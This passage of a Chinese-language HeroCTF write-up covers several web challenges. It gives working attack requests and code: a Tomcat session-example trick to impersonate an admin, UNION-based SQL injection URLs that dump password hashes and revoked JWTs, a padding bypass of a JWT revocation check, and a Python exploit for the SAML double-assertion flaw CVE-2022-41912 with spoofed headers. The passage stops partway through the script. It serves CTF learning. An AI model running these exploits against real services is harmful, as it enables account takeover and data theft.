+            html<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"&lt;p style='color:red;'>"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"&lt;/p>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+
+        html<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"&lt;form method='post'>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        html<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"&lt;input name='username' />"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        html<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"&lt;button type='submit'>Join&lt;/button>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        html<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"&lt;/form>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>username <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            html<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"&lt;p>You are on the good side Lord "</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"&lt;/p>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            html<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"&lt;form action='/dark/' method='get'>&lt;button>Go dark&lt;/button>&lt;/form>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+
+        html<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"&lt;/body>&lt;/html>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        resp<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>html<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token annotation punctuation">@Override</span>
+    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doPost</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> req<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> resp<span class="token punctuation">)</span>
+            <span class="token keyword">throws</span> <span class="token class-name">ServletException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>
+        <span class="token class-name">String</span> username <span class="token operator">=</span> req<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"darth_sidious"</span><span class="token punctuation">.</span><span class="token function">equalsIgnoreCase</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            req<span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token string">"error"</span><span class="token punctuation">,</span> <span class="token string">"Forbidden username."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token function">doGet</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> resp<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">return</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+        req<span class="token punctuation">.</span><span class="token function">getSession</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">,</span> username<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        resp<span class="token punctuation">.</span><span class="token function">sendRedirect</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span><span class="token function">getContextPath</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+</code></pre>
+
+<pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>dark</span><span class="token punctuation">;</span>
+
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">jakarta<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">ServletException</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">jakarta<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span>
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AdminServlet</span> <span class="token keyword">extends</span> <span class="token class-name">HttpServlet</span> <span class="token punctuation">&#123;</span>
+
+    <span class="token annotation punctuation">@Override</span>
+    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doGet</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> req<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> resp<span class="token punctuation">)</span>
+            <span class="token keyword">throws</span> <span class="token class-name">ServletException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>
+
+        resp<span class="token punctuation">.</span><span class="token function">setContentType</span><span class="token punctuation">(</span><span class="token string">"text/html;charset=UTF-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token class-name">HttpSession</span> s <span class="token operator">=</span> req<span class="token punctuation">.</span><span class="token function">getSession</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">String</span> username <span class="token operator">=</span> s <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">?</span> <span class="token keyword">null</span> <span class="token operator">:</span> <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span> s<span class="token punctuation">.</span><span class="token function">getAttribute</span><span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token class-name">StringBuilder</span> html <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token string">"&lt;html>&lt;body>&lt;h1>Admin Panel&lt;/h1>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"darth_sidious"</span><span class="token punctuation">.</span><span class="token function">equalsIgnoreCase</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            html<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"&lt;p>Welcome Lord Sidious, Vador says: Hero&#123;fake_flag&#125;.&lt;/p>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+            html<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"&lt;p>Access denied.&lt;/p>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+
+        html<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"&lt;/body>&lt;/html>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        resp<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>html<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+</code></pre>
+
+<p>由于session统一管理可以共享，所以可以利用tomcat的session example生成一个username&#x3D;darth_sidious的session，然后访问<code>/dark/admin</code>即可</p>
+<pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;dyn09.heroctf.fr:13717&#x2F;examples&#x2F;servlets&#x2F;servlet&#x2F;SessionExample?dataname&#x3D;username&amp;datavalue&#x3D;darth_sidious</code></pre>
+
+<pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;dyn09.heroctf.fr:13717&#x2F;dark&#x2F;admin</code></pre>
+
+<p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251129204056.png" alt="image.png" loading="lazy"></p>
+<h3 id="Revoked"><a href="#Revoked" class="headerlink" title="Revoked"></a>Revoked</h3><p>联合注入获取admin1的哈希</p>
+<pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;dyn13.heroctf.fr:13576&#x2F;employees?query&#x3D;Alice%&#39;union SELECT id, username, is_admin, password_hash FROM users--</code></pre>
+
+<p>然后hashcat爆破就行了<br><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251129220823.png" alt="image.png" loading="lazy"></p>
+<p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251129220816.png" alt="image.png" loading="lazy"></p>
+<h3 id="Revoked-Revenge"><a href="#Revoked-Revenge" class="headerlink" title="Revoked Revenge"></a>Revoked Revenge</h3><p>首先写了历史jwt</p>
+<pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;dyn02.heroctf.fr:12228&#x2F;employees?query&#x3D;Alice%&#39; UNION SELECT 1, id, 3, token FROM revoked_tokens--</code></pre>
+
+<p>找到管理员的</p>
+<pre class="language-none"><code class="language-none">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaXNfYWRtaW4iOjEsImlzc3VlZCI6MTc2NDQyNTYzNS42MzY5MDM4fQ.Arejz0ENdgFXjOpGfxBYnJOV93NHZjNdBZUodJYSIBw</code></pre>
+
+<p>后面加个&#x3D;就能绕过,因为一般jwt会忽略到base64末尾的&#x3D;，加上不影响解析</p>
+<pre class="language-none"><code class="language-none">&quot;SELECT id FROM revoked_tokens WHERE token &#x3D; ?&quot;, (token,)</code></pre>
+
+<p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251129223629.png" alt="image.png" loading="lazy"></p>
+<h3 id="SAMLevinson"><a href="#SAMLevinson" class="headerlink" title="SAMLevinson"></a>SAMLevinson</h3><p>根据描述可以是CVE-2022-41912 ,是一个SAML协议的一个解析漏洞。</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/crewjam/saml/commit/aee3fb1edeeaf1088fcb458727e0fd863d277f8b">来自GHSA-j2jp-wvqg-wc2g · 的合并拉取请求Crewjam&#x2F;saml@aee3fb1</a></p>
+<p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251129232241.png" alt="image.png" loading="lazy"></p>
+<p>当 XML 中包含多个 <code>&lt;Assertion&gt;</code> 元素时，用 Go 原生反序列化（unmarshal）得到的 <code>resp.Assertion</code> 结构 <strong>只会保留最后一个 Assertion</strong>。换句话说，如果有两个 Assertion，只有第二个（最后一个）会被反序列化对象所表示。<br>攻击者可以利用这一差异，构造一个 SAML Response，包含 <strong>两个 Assertion</strong>：</p>
+<ol>
+<li>第一个 Assertion 是合法签名且有效的（例如普通用户的 Assertion）</li>
+<li>第二个 Assertion 是伪造的（例如高权限账户的 Assertion），但不经过签名验证（因为签名验证只针对第一个 Assertion）<br>然后写个脚本即可<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
+<span class="token keyword">import</span> re
+<span class="token keyword">import</span> base64
+<span class="token keyword">import</span> html
+<span class="token keyword">import</span> random
+<span class="token keyword">import</span> string
+
+<span class="token comment"># ================= 配置区域 =================</span>
+<span class="token comment"># 目标 APP (Service Provider)</span>
+URL_APP <span class="token operator">=</span> <span class="token string">"http://web.heroctf.fr:8080"</span>
+<span class="token comment"># 身份提供者 (Identity Provider)</span>
+URL_IDP <span class="token operator">=</span> <span class="token string">"http://web.heroctf.fr:8081"</span>
+
+<span class="token comment"># 题目提供的合法低权限账号</span>
+USERNAME <span class="token operator">=</span> <span class="token string">"user"</span>
+PASSWORD <span class="token operator">=</span> <span class="token string">"oyJPNYd3HgeBkaE%!rP#dZvqf2z*4$^qcCW4V6WM"</span>
+<span class="token comment"># ===========================================</span>
+
+<span class="token comment"># 创建 Session 以维持 Cookie</span>
+s <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>
+s<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
+    <span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">exploit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[*] 1. 访问 APP (</span><span class="token interpolation"><span class="token punctuation">&#123;</span>URL_APP<span class="token punctuation">&#125;</span></span><span class="token string">/flag)，触发 SAML 流程..."</span></span><span class="token punctuation">)</span>
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        r <span class="token operator">=</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>URL_APP<span class="token punctuation">&#125;</span></span><span class="token string">/flag"</span></span><span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
+    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[-] 连接失败: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>e<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
+        <span class="token keyword">return</span>
+
+    <span class="token comment"># 检查是否跳转到了 IDP 登录页</span>
+    <span class="token keyword">if</span> <span class="token string">"sso"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>url <span class="token keyword">and</span> <span class="token string">"SAMLRequest"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[-] 未跳转到登录页，当前 URL: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>r<span class="token punctuation">.</span>url<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
+        <span class="token keyword">return</span>
+
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*] 2. 从页面提取 SAMLRequest 和 RelayState..."</span><span class="token punctuation">)</span>
+    <span class="token comment"># 从 HTML hidden input 中提取，而不是从 URL 参数提取 (防止编码问题)</span>
+    req_match <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r'name="SAMLRequest" value="(.*?)"'</span><span class="token punctuation">,</span> r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
+    relay_match <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r'name="RelayState" value="(.*?)"'</span><span class="token punctuation">,</span> r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
+    
+    <span class="token keyword">if</span> <span class="token keyword">not</span> req_match<span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[-] 无法提取 SAMLRequest。"</span><span class="token punctuation">)</span>
+        <span class="token keyword">return</span>
+
+    saml_request <span class="token operator">=</span> html<span class="token punctuation">.</span>unescape<span class="token punctuation">(</span>req_match<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    relay_state <span class="token operator">=</span> html<span class="token punctuation">.</span>unescape<span class="token punctuation">(</span>relay_match<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">if</span> relay_match <span class="token keyword">else</span> <span class="token string">""</span>
+
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*] 3. 在 IDP 登录获取合法的 SAMLResponse..."</span><span class="token punctuation">)</span>
+    login_data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+        <span class="token string">"user"</span><span class="token punctuation">:</span> USERNAME<span class="token punctuation">,</span>
+        <span class="token string">"password"</span><span class="token punctuation">:</span> PASSWORD<span class="token punctuation">,</span>
+        <span class="token string">"SAMLRequest"</span><span class="token punctuation">:</span> saml_request<span class="token punctuation">,</span>
+        <span class="token string">"RelayState"</span><span class="token punctuation">:</span> relay_state
+    <span class="token punctuation">&#125;</span>
+    
+    <span class="token comment"># 发送登录请求</span>
+    r_login <span class="token operator">=</span> s<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>URL_IDP<span class="token punctuation">&#125;</span></span><span class="token string">/sso"</span></span><span class="token punctuation">,</span> data<span class="token operator">=</span>login_data<span class="token punctuation">)</span>
+    
+    <span class="token keyword">if</span> r_login<span class="token punctuation">.</span>status_code <span class="token operator">!=</span> <span class="token number">200</span><span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[-] 登录失败，状态码: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>r_login<span class="token punctuation">.</span>status_code<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
+        <span class="token keyword">return</span>
+
+    <span class="token comment"># 提取 IDP 返回的 SAMLResponse (Base64)</span>
+    resp_match <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r'name="SAMLResponse" value="(.*?)"'</span><span class="token punctuation">,</span> r_login<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
+    <span class="token keyword">if</span> <span class="token keyword">not</span> resp_match<span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[-] 登录后未找到 SAMLResponse，认证可能失败。"</span><span class="token punctuation">)</span>
+        <span class="token keyword">return</span>
+    
+    raw_saml_response <span class="token operator">=</span> html<span class="token punctuation">.</span>unescape<span class="token punctuation">(</span>resp_match<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[+] 获取到合法 Response (长度: </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">len</span><span class="token punctuation">(</span>raw_saml_response<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">)"</span></span><span class="token punctuation">)</span>
+    
+    <span class="token comment"># ================= 漏洞利用核心：构造双断言 =================</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*] 4. 执行 CVE-2022-41912 攻击 (构造双断言)..."</span><span class="token punctuation">)</span>
+    
+    <span class="token comment"># A. 解码 XML</span>
+    xml_content <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>raw_saml_response<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
+
+    <span class="token comment"># B. 提取原始的合法 Assertion (带签名的)</span>
+    <span class="token comment"># 我们需要完整提取 &lt;saml:Assertion ...> 到 &lt;/saml:Assertion></span>
+    <span class="token comment"># 使用非贪婪匹配提取第一个 Assertion</span>
+    pattern <span class="token operator">=</span> <span class="token string">r'(&lt;saml:Assertion.*?&lt;\/saml:Assertion>)'</span>
+    <span class="token keyword">match</span> <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>pattern<span class="token punctuation">,</span> xml_content<span class="token punctuation">,</span> re<span class="token punctuation">.</span>DOTALL<span class="token punctuation">)</span>
+    
+    <span class="token keyword">if</span> <span class="token keyword">not</span> <span class="token keyword">match</span><span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[-] 无法提取 Assertion，XML 结构可能不标准。"</span><span class="token punctuation">)</span>
+        <span class="token keyword">return</span>
+
+    valid_assertion <span class="token operator">=</span> <span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] 提取到 Valid Assertion (用于绕过签名验证)。"</span><span class="token punctuation">)</span>
+
+    <span class="token comment"># C. 制作恶意的 Assertion (基于合法断言修改)</span>
+    evil_assertion <span class="token operator">=</span> valid_assertion
+    
+    <span class="token comment"># 1. 移除签名 (删除 &lt;ds:Signature>... &lt;/ds:Signature>)</span>
+    evil_assertion <span class="token operator">=</span> re<span class="token punctuation">.</span>sub<span class="token punctuation">(</span><span class="token string">r'&lt;ds:Signature.*?>.*?&lt;\/ds:Signature>'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> evil_assertion<span class="token punctuation">,</span> flags<span class="token operator">=</span>re<span class="token punctuation">.</span>DOTALL<span class="token punctuation">)</span>
+    
+    <span class="token comment"># 2. 修改用户身份 (User -> Admin)</span>
+    <span class="token comment"># 替换 uid</span>
+    evil_assertion <span class="token operator">=</span> evil_assertion<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'>user&lt;'</span><span class="token punctuation">,</span> <span class="token string">'>admin&lt;'</span><span class="token punctuation">)</span>
+    <span class="token comment"># 替换组 (Users -> Administrators)</span>
+    evil_assertion <span class="token operator">=</span> evil_assertion<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'>Users&lt;'</span><span class="token punctuation">,</span> <span class="token string">'>Administrators&lt;'</span><span class="token punctuation">)</span>
+
+    <span class="token comment"># 3. 修改 ID (防止 ID 冲突导致解析报错)</span>
+    new_id <span class="token operator">=</span> <span class="token string">"id-"</span> <span class="token operator">+</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>random<span class="token punctuation">.</span>choices<span class="token punctuation">(</span>string<span class="token punctuation">.</span>ascii_lowercase <span class="token operator">+</span> string<span class="token punctuation">.</span>digits<span class="token punctuation">,</span> k<span class="token operator">=</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    evil_assertion <span class="token operator">=</span> re<span class="token punctuation">.</span>sub<span class="token punctuation">(</span><span class="token string">r'ID="[^"]*"'</span><span class="token punctuation">,</span> <span class="token string-interpolation"><span class="token string">f'ID="</span><span class="token interpolation"><span class="token punctuation">&#123;</span>new_id<span class="token punctuation">&#125;</span></span><span class="token string">"'</span></span><span class="token punctuation">,</span> evil_assertion<span class="token punctuation">,</span> count<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>
+
+    <span class="token comment"># 4. 修改时间戳 (防止 403 Forbidden)</span>
+    <span class="token comment"># 强制将有效期覆盖为 2020年 - 2035年</span>
+    evil_assertion <span class="token operator">=</span> re<span class="token punctuation">.</span>sub<span class="token punctuation">(</span><span class="token string">r'NotBefore="[^"]*"'</span><span class="token punctuation">,</span> <span class="token string">'NotBefore="2020-01-01T00:00:00Z"'</span><span class="token punctuation">,</span> evil_assertion<span class="token punctuation">)</span>
+    evil_assertion <span class="token operator">=</span> re<span class="token punctuation">.</span>sub<span class="token punctuation">(</span><span class="token string">r'NotOnOrAfter="[^"]*"'</span><span class="token punctuation">,</span> <span class="token string">'NotOnOrAfter="2035-01-01T00:00:00Z"'</span><span class="token punctuation">,</span> evil_assertion<span class="token punctuation">)</span>
+
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] 恶意 Assertion 构造完成。"</span><span class="token punctuation">)</span>
+
+    <span class="token comment"># D. 拼接 XML (关键步骤：Valid 在前，Evil 在后)</span>
+    <span class="token comment"># 查找 Valid Assertion 在原文中的结束位置</span>
+    insert_pos <span class="token operator">=</span> xml_content<span class="token punctuation">.</span>find<span class="token punctuation">(</span>valid_assertion<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">len</span><span class="token punctuation">(</span>valid_assertion<span class="token punctuation">)</span>
+    
+    <span class="token comment"># 在 Valid Assertion 后面追加 Evil Assertion</span>
+    final_xml <span class="token operator">=</span> xml_content<span class="token punctuation">[</span><span class="token punctuation">:</span>insert_pos<span class="token punctuation">]</span> <span class="token operator">+</span> evil_assertion <span class="token operator">+</span> xml_content<span class="token punctuation">[</span>insert_pos<span class="token punctuation">:</span><span class="token punctuation">]</span>
+    
+    <span class="token comment"># 验证拼接结果包含两个断言</span>
+    <span class="token keyword">if</span> final_xml<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">"saml:Assertion"</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">:</span> <span class="token comment"># 开始标签+结束标签 * 2 = 4</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[-] XML 拼接可能由问题，Assertion 数量不对。"</span><span class="token punctuation">)</span>
+
+    <span class="token comment"># E. 重新编码为 Base64</span>
+    payload <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>final_xml<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
+    
+    <span class="token comment"># ================= 发送 Payload =================</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*] 5. 发送 Payload 到 APP (SAML ACS)..."</span><span class="token punctuation">)</span>
+    acs_url <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>URL_APP<span class="token punctuation">&#125;</span></span><span class="token string">/saml/acs"</span></span>
+    
+    <span class="token comment"># [关键] 伪造 Headers 绕过 Origin/Referer 检查</span>
+    spoofed_headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+        <span class="token string">"Origin"</span><span class="token punctuation">:</span> URL_IDP<span class="token punctuation">,</span>
+        <span class="token string">"Referer"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>URL_IDP<span class="token punctuation">&#125;</span></span><span class="token string">/"</span></span><span class="token punctuation">,</span>
+        <span class="token string">"Content-Type"</span><span class="token punctuation">:</span> <span class="token string">"application/x-www-form-urlencoded"</span>
+    <span class="token punctuation">&#125;</span>
+    
+    acs_data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+        <span class="token string">"SAMLResponse"</span><span class="token punctuation">:</span> payload<span class="token punctuation">,</span>
+        <span class="token string">"RelayState"</span><span class="token punctuation">:</span> relay_state
+    <span class="token punctuation">&#125;</span>
+    
+    <span class="token comment"># 发送 POST 请求</span>
+    r_final <span class="token operator">=</span> s<span class="token punctuation">.</span>post<span class="token punctuation">(</span>acs_url<span class="token punctuation">,</span> data<span class="token operator">=</span>acs_data<span class="token punctuation">,</span> headers<span class="token operator">=</span>spoofed_headers<span class="token punctuation">)</span>
+    
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[*] 响应状态码: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>r_final<span class="token punctuation">.</span>status_code<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
+    
+    <span class="token comment"># ================= 结果检查 =================</span>
+    <span class="token keyword">if</span> <span class="token string">"Hero&#123;"</span> <span class="token keyword">in</span> r_final<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\n"</span> <span class="token operator">+</span> <span class="token string">"="</span><span class="token operator">*</span><span class="token number">40</span><span class="token punctuation">)</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[SUCCESS] 攻击成功！Flag 如下:"</span><span class="token punctuation">)</span>
+        <span class="token comment"># 提取 Flag</span>
